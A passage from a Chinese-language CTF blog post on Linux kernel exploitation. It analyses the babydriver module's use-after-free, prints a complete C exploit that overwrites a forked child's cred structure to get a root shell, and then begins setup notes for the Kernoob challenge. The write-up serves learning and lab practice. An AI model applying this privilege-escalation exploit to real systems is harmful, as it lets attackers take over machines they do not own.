<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~/babydriver$ cd rootfs/lib/modules/4.4.72/</span><br><span class="line">winter@ubuntu:~/babydriver/rootfs/lib/modules/4.4.72$ ls</span><br><span class="line">babydriver.ko</span><br><span class="line">winter@ubuntu:~/babydriver/rootfs/lib/modules/4.4.72$ file babydriver.ko </span><br><span class="line">babydriver.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=8ec63f63d3d3b4214950edacf9e65ad76e0e00e7, not stripped</span><br><span class="line">winter@ubuntu:~/babydriver/rootfs/lib/modules/4.4.72$ checksec babydriver.ko </span><br><span class="line">[*] '/home/winter/babydriver/rootfs/lib/modules/4.4.72/babydriver.ko'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>

<p>64位的</p>
</li>
</ol>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><h5 id="init"><a href="#init" class="headerlink" title="init"></a>init</h5><blockquote>
<p>看看即可</p>
</blockquote>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>

<h5 id="LKMs"><a href="#LKMs" class="headerlink" title="LKMs"></a>LKMs</h5><p><img src="/2021/06/05/kernel-study/image-20210605210915873.png" alt="image-20210605210915873"></p>
<p>本题提供了五个函数</p>
<ol>
<li><p>open</p>
<p><img src="/2021/06/05/kernel-study/image-20210605211023321.png" alt="image-20210605211023321"></p>
<p>打开设备时，程序申请一个64字节的chunk给全局变量device_buf，并且将size赋值给device_buf_size</p>
</li>
<li><p>write</p>
<p><img src="/2021/06/05/kernel-study/image-20210605211737963.png" alt="image-20210605211737963"></p>
<ol>
<li>首先看device_buf是否分配了chunk，device_buf_len&gt;要写入的长度</li>
<li>通过copy_from_user拷贝数据，因为是将rsi的数据拷贝到rdi，也就是将buffer里的数据拷贝到device_buf</li>
</ol>
</li>
<li><p>read</p>
<p>与write类似</p>
</li>
<li><p>release</p>
<p><img src="/2021/06/05/kernel-study/image-20210605212036394.png" alt="image-20210605212036394"></p>
<p>释放device_buf指向的chunk，但没有置零【UAF】</p>
</li>
<li><p>ioctl</p>
<p><img src="/2021/06/05/kernel-study/image-20210605212140400.png" alt="image-20210605212140400"></p>
<ol>
<li>esi的值位0x10001</li>
<li>释放device_buf</li>
<li>并且申请一个用户传入的size重新分配chunk【v4=v3=rdx】</li>
<li>然后将size赋值给device_buf_len</li>
</ol>
</li>
</ol>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>因为open申请的时候，是将地址赋值给一个全局变量<code>babydev_struct.device_buf</code>，且程序将操作结果赋值给给该变量。</p>
<ol>
<li><p>申请两个设备，那么将分配两个设备描述符</p>
<blockquote>
<p>注意，申请多个设备，对他们的操作应该是独立的，但是本题中由于将结果都赋值到一个全局变量中，导致多个设备之间底层使用的是同一个地址。</p>
</blockquote>
<p><img src="/2021/06/05/kernel-study/image-20210606152944747.png" alt="image-20210606152944747"></p>
<p>由于程序将结果保存再一个全局变量中，故对两个设备的操作，本质上是对同一地址操作</p>
<ul>
<li>申请fd1，会申请一块空间，并赋值给了<code>babydev_struct.device_buf</code></li>
<li>再次申请fd2，同一会再次申请一块空间，覆盖<code>babydev_struct.device_buf</code>里原来的值</li>
</ul>
</li>
<li><p>ioctl fd1，将全局变量的chunk大小变为cred结构题一样大</p>
<p><code>babydev_struct.device_buf=新申请的0xa8的地址</code></p>
</li>
<li><p>close fd1，释放了fd1，即释放了<code>babydev_struct.device_buf</code>，由于fd1和fd2指向同一地址，故fd2指向了一块以释放内存</p>
</li>
<li><p>fork，将一个进程分裂出一个子进程【父进程将与子进程共享内存空间】</p>
<p>子进程被创建时将创建对应的<code>struct cred</code> =&gt; <code>babydev_struct.device_buf</code>指向的已释放的内存分配走</p>
</li>
<li><p>通过fd2修改内容，就是修改4中子进程的cred，则提权成功！</p>
</li>
</ol>
<h5 id="调试信息-2"><a href="#调试信息-2" class="headerlink" title="调试信息"></a>调试信息</h5><p><img src="/2021/06/05/kernel-study/image-20210606140816472.png" alt="image-20210606140816472"></p>
<p>根据调试信息对比ida可以看出，0xffffffffc00024d0地址就是babydev_struct.device_buf</p>
<blockquote>
<p>尚未初始化的时候，值为0</p>
</blockquote>
<p><img src="/2021/06/05/kernel-study/image-20210606144728288.png" alt="image-20210606144728288"></p>
<blockquote>
<p>第一次申请设备</p>
</blockquote>
<p><img src="/2021/06/05/kernel-study/image-20210606144740804.png" alt="image-20210606144740804"></p>
<blockquote>
<p>第二次申请设备</p>
</blockquote>
<p><img src="/2021/06/05/kernel-study/image-20210606144750687.png" alt="image-20210606144750687"></p>
<blockquote>
<p>ioctl，修改设备1chunk的大小为cred_size</p>
</blockquote>
<p><img src="/2021/06/05/kernel-study/image-20210606144805046.png" alt="image-20210606144805046"></p>
<blockquote>
<p>释放设备1，此时设备2的device_buf将指向一块以释放内存</p>
</blockquote>
<p><img src="/2021/06/05/kernel-study/image-20210606144818089.png" alt="image-20210606144818089"></p>
<blockquote>
<p>cred结构体的前28个字节都被设置为0（包括uid、gid）</p>
</blockquote>
<p><img src="/2021/06/05/kernel-study/image-20210606144822285.png" alt="image-20210606144822285"></p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//申请两个设备</span></span><br><span class="line">    <span class="keyword">int</span> fd1 = <span class="built_in">open</span>(<span class="string">"/dev/babydev"</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = <span class="built_in">open</span>(<span class="string">"/dev/babydev"</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fd1:%d\n"</span>,fd1);<span class="comment">//文件描述符3</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fd2:%d\n"</span>,fd2);<span class="comment">//文件描述符4</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 修改device_buf_len 为 sizeof(struct cred)</span></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xA8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放fd1，此时，LKMs2的device_buf将指向一块大小为sizeof(struct cred)的已free的内存</span></span><br><span class="line">    <span class="built_in">close</span>(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 新起进程的 cred 空间将占用那一块已free的内存</span></span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*] fork error!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 篡改新进程的 cred 的 uid，gid 等值为0</span></span><br><span class="line">        <span class="keyword">char</span> zeros[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">write</span>(fd2, zeros, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[+] root now."</span>);</span><br><span class="line">            system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(fd2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210606154209689.png" alt="image-20210606154209689"></p>
<h3 id="5-2020高校战疫分享赛-–-Kernoob"><a href="#5-2020高校战疫分享赛-–-Kernoob" class="headerlink" title="5.2020高校战疫分享赛 – Kernoob"></a>5.2020高校战疫分享赛 – Kernoob</h3><h4 id="下载文件-4"><a href="#下载文件-4" class="headerlink" title="下载文件"></a>下载文件</h4><p><a href="Kernoob.zip">附件</a>        <a href="https://adworld.xctf.org.cn/match/contest_challenge?event=134&hash=a94cbc83-14c0-4de3-85f8-55ef6ed4361c.event" target="_blank" rel="noopener">链接</a></p>
<p>给了四个文件：bzImage、initramfs.cpio、noob.ko和startvm.sh</p>
<h4 id="预备-2"><a href="#预备-2" class="headerlink" title="预备"></a>预备</h4><ol>
<li><p>解压cpio的dc.sh</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">mkdir initramfs</span><br><span class="line">cd initramfs</span><br><span class="line">cpio -idvm &lt; ../initramfs.cpio</span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure>
</li>
<li><p>打包文件系统initramfs.cpio的ci.sh</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">cd initramfs</span><br><span class="line">find . | cpio -H newc -o &gt; ../initramfs.img</span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure>
</li>
<li><p>程序基址</p>
<p>本程序没有lib文件夹</p>
<p>方法是<code>grep noob /proc/kallsyms</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">~ $ grep noob /proc/kallsyms</span><br><span class="line">ffffffffc0002000 t copy_overflow	[noob]</span><br><span class="line">ffffffffc0003120 r kernel_read_file_str	[noob]</span><br><span class="line">ffffffffc0002043 t add_note	[noob]</span><br><span class="line">ffffffffc000211c t del_note	[noob]</span><br><span class="line">ffffffffc0002180 t show_note	[noob]</span><br><span class="line">ffffffffc00022d8 t edit_note	[noob]</span><br><span class="line">ffffffffc0002431 t noob_ioctl	[noob]</span><br><span class="line">ffffffffc0004000 d fops	[noob]</span><br><span class="line">ffffffffc0004100 d misc	[noob]</span><br><span class="line">ffffffffc0003078 r .LC1	[noob]</span><br><span class="line">ffffffffc00044c0 b pool	[noob]</span><br><span class="line">ffffffffc0004180 d __this_module	[noob]</span><br><span class="line">ffffffffc00024f2 t cleanup_module	[noob]</span><br><span class="line">ffffffffc00024ca t init_module	[noob]</span><br><span class="line">ffffffffc00024f2 t noob_exit	[noob]</span><br><span class="line">ffffffffc00024ca t noob_init	[noob]</span><br></pre></td></tr></table></figure>

<p>其中t、d、b开头的地址就是.text、.data和.bss的基地址</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set architecture i386:x86-64:intel</span><br><span class="line">add-symbol-file noob.ko 0xffffffffc0002000 -s .data 0xffffffffc0004000 -s .bss 0xffffffffc00044C0</span><br></pre></td></tr></table></figure>
</li>
<li><p>关闭端口</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -anp |grep 1234</span><br><span class="line">kill -9 pid</span><br></pre></td></tr></table></figure>
</li>
<li></li>
</ol>
<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><h5 id="init-1"><a href="#init-1" class="headerlink" title="init"></a>init</h5><p>这次init是空的，故该为查看<code>/etc/init.d/rcS</code></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">echo "Welcome :)"</span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount /dev/pts</span><br><span class="line"></span><br><span class="line"><span class="comment">#直接在home下加载的模块</span></span><br><span class="line">insmod /home/pwn/noob.ko</span><br><span class="line">chmod 666 /dev/noob</span><br><span class="line"></span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"></span><br><span class="line">cd /home/pwn</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>

<h5 id="LKMs-1"><a href="#LKMs-1" class="headerlink" title="LKMs"></a>LKMs</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~/kernoob$ file noob.ko </span><br><span class="line">noob.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=7bc6535b4946f6dd01729e9b31c36e400efc8479, not stripped</span><br><span class="line">winter@ubuntu:~/kernoob$ checksec noob.ko </span><br><span class="line">[*] '/home/winter/kernoob/noob.ko'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>

<p>64位程序，只开启了NX</p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/kernel-pwn/" rel="tag"># kernel pwn</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/05/13/20-52-undefined/" rel="prev" title="Mar.DASCTF明御攻防赛">
      <i class="fa fa-chevron-left"></i> Mar.DASCTF明御攻防赛
    </a></div>
      <div class="post-nav-item">
    <a href="/2021/06/06/23-39-undefined/" rel="next" title="os真象还原-笔记">
      os真象还原-笔记 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          المحتويات
        </li>
        <li class="sidebar-nav-overview">
          عام
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#基础知识"><span class="nav-number">1.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#概念性"><span class="nav-number">1.1.</span> <span class="nav-text">概念性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IRET"><span class="nav-number">1.2.</span> <span class="nav-text">IRET</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#thread-info"><span class="nav-number">1.3.</span> <span class="nav-text">thread_info</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#restart-block"><span class="nav-number">1.3.1.</span> <span class="nav-text">restart_block</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#调用fn"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">调用fn</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mmap"><span class="nav-number">1.4.</span> <span class="nav-text">mmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#memcpy"><span class="nav-number">1.5.</span> <span class="nav-text">memcpy</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#函数原型"><span class="nav-number">1.5.1.</span> <span class="nav-text">函数原型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参数"><span class="nav-number">1.5.2.</span> <span class="nav-text">参数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#返回值"><span class="nav-number">1.5.3.</span> <span class="nav-text">返回值</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kptr-restrict"><span class="nav-number">1.6.</span> <span class="nav-text">kptr_restrict</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tty"><span class="nav-number">1.7.</span> <span class="nav-text">tty</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ptmx"><span class="nav-number">1.8.</span> <span class="nav-text">ptmx</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kmalloc"><span class="nav-number">1.9.</span> <span class="nav-text">kmalloc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#cache结构"><span class="nav-number">1.9.1.</span> <span class="nav-text">cache结构</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#slab-slub分配器"><span class="nav-number">1.10.</span> <span class="nav-text">slab&#x2F;slub分配器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mount"><span class="nav-number">1.11.</span> <span class="nav-text">mount</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#file-operations"><span class="nav-number">1.12.</span> <span class="nav-text">file_operations</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#read函数"><span class="nav-number">1.12.1.</span> <span class="nav-text">read函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#write函数"><span class="nav-number">1.12.2.</span> <span class="nav-text">write函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内核态函数调用"><span class="nav-number">1.13.</span> <span class="nav-text">内核态函数调用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cred-结构体"><span class="nav-number">1.14.</span> <span class="nav-text">cred 结构体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fork"><span class="nav-number">1.15.</span> <span class="nav-text">fork</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#具体操作"><span class="nav-number">2.</span> <span class="nav-text">具体操作</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#启动"><span class="nav-number">2.1.</span> <span class="nav-text">启动</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#调试"><span class="nav-number">2.2.</span> <span class="nav-text">调试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#第一部分：c文件"><span class="nav-number">2.2.1.</span> <span class="nav-text">第一部分：c文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第二部分：vmlinux"><span class="nav-number">2.2.2.</span> <span class="nav-text">第二部分：vmlinux</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第三部分：查找LKMs模块基址"><span class="nav-number">2.2.3.</span> <span class="nav-text">第三部分：查找LKMs模块基址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第四部分：gdb"><span class="nav-number">2.2.4.</span> <span class="nav-text">第四部分：gdb</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第五部分：执行qemu里的c程序"><span class="nav-number">2.2.5.</span> <span class="nav-text">第五部分：执行qemu里的c程序</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提权"><span class="nav-number">2.3.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#地址"><span class="nav-number">2.3.1.</span> <span class="nav-text">地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#步骤"><span class="nav-number">2.3.2.</span> <span class="nav-text">步骤</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bypass-SMEP"><span class="nav-number">2.4.</span> <span class="nav-text">Bypass SMEP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#绕过来由"><span class="nav-number">2.4.1.</span> <span class="nav-text">绕过来由</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#smep原理"><span class="nav-number">2.4.2.</span> <span class="nav-text">smep原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#基本方法"><span class="nav-number">2.4.3.</span> <span class="nav-text">基本方法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#trick"><span class="nav-number">2.5.</span> <span class="nav-text">trick</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-mmap-min-addr"><span class="nav-number">2.5.1.</span> <span class="nav-text">1.mmap_min_addr</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目"><span class="nav-number">3.</span> <span class="nav-text">题目</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Root-Me-LinKern-x86-–-Buffer-overflow-basic-1"><span class="nav-number">3.1.</span> <span class="nav-text">1.[Root-Me]LinKern x86 – Buffer overflow basic 1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#下载文件"><span class="nav-number">3.1.1.</span> <span class="nav-text">下载文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析init"><span class="nav-number">3.1.2.</span> <span class="nav-text">分析init</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析LKMs文件"><span class="nav-number">3.1.3.</span> <span class="nav-text">分析LKMs文件</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#read"><span class="nav-number">3.1.3.1.</span> <span class="nav-text">read</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#write"><span class="nav-number">3.1.3.2.</span> <span class="nav-text">write</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.1.4.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp"><span class="nav-number">3.1.5.</span> <span class="nav-text">exp</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#调试信息"><span class="nav-number">3.1.5.1.</span> <span class="nav-text">调试信息</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#question"><span class="nav-number">3.1.6.</span> <span class="nav-text">question</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#上传脚本"><span class="nav-number">3.1.6.1.</span> <span class="nav-text">上传脚本</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#musl-gcc编译32位"><span class="nav-number">3.1.6.2.</span> <span class="nav-text">musl-gcc编译32位</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Root-Me-LinKern-x86-Null-pointer-dereference"><span class="nav-number">3.2.</span> <span class="nav-text">2.[Root-Me]LinKern x86 - Null pointer dereference</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#下载文件-1"><span class="nav-number">3.2.1.</span> <span class="nav-text">下载文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析init文件"><span class="nav-number">3.2.2.</span> <span class="nav-text">分析init文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析LKMs文件-1"><span class="nav-number">3.2.3.</span> <span class="nav-text">分析LKMs文件</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#read-1"><span class="nav-number">3.2.3.1.</span> <span class="nav-text">read</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#write-1"><span class="nav-number">3.2.3.2.</span> <span class="nav-text">write</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞分析"><span class="nav-number">3.2.4.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a 